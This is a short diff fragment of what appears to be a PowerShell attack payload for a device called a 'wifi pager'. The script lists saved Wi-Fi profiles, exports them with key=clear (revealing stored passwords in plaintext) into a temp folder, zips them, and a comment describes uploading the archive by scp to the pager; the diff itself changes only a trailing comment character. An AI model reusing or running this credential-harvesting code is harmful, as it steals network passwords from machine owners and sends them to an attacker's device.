@@ -15,7 +15,7 @@ netsh wlan show profiles
 netsh wlan export profile key=clear folder="$env:TEMP\wifi"
 
 # Creats an archive of all files named wifi.zip in %TEMP%\wifi
-Compress-Archive -Path "$env:TEMP\wifi\*" -DestinationPath "$env:TEMP\wifi\wifi.zip" -Force #
+Compress-Archive -Path "$env:TEMP\wifi\*" -DestinationPath "$env:TEMP\wifi\wifi.zip" -Force
 
 # wifi pager scp upload cmd using public key instead of password to upload to pager
 $ErrorActionPreference = "Stop"
